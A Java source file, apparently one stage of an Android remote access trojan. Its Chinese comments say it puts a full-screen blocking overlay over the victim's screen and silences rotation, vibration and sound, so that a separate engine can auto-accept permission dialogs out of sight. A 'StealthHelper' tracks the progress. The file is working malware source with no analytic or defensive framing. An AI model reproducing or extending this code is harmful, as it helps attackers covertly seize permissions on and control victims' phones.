package com.vendor.rat.auto.pipeline.stage;

import android.util.Log;

import com.vendor.rat.auto.pipeline.PipelineContext;
import com.vendor.rat.auto.pipeline.PipelineStage;
import com.vendor.rat.helper.BlockViewHelper;
import com.vendor.rat.helper.StealthHelper;

/**
 * Stage 3: 显示遮罩
 *
 * 显示全屏 BlockView 遮罩，禁用旋转/震动/声音。
 * 遮罩显示后 PermissionAutoGrantEngine 开始响应权限弹窗。
 */
public class ShowOverlayStage implements PipelineStage {

    private static final String TAG = "ShowOverlayStage";

    @Override
    public void handle(PipelineContext passable, Runnable next) {
        BlockViewHelper.show(null);
        passable.setOverlayShowing(BlockViewHelper.isShowing());

        if (!passable.isOverlayShowing()) {
            Log.w(TAG, "Failed to show overlay");
            return;
        }

        StealthHelper.updateProgress(10);
        Log.d(TAG, "Overlay displayed, progress=10%");
        next.run();
    }
}
